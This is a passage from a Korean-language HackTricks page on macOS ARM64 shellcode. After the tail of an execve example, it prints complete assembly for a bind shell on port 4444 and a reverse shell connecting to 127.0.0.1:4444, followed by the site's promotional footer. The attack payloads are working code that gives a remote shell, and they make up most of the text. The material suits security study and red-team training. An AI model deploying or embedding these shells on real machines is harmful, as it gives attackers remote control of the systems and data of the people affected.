svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### 바인드 쉘

바인드 쉘은 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s)에서 **포트 4444**로 사용할 수 있습니다.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 리버스 쉘

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)에서 **127.0.0.1:4444**로 리버스 쉘을 실행합니다.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
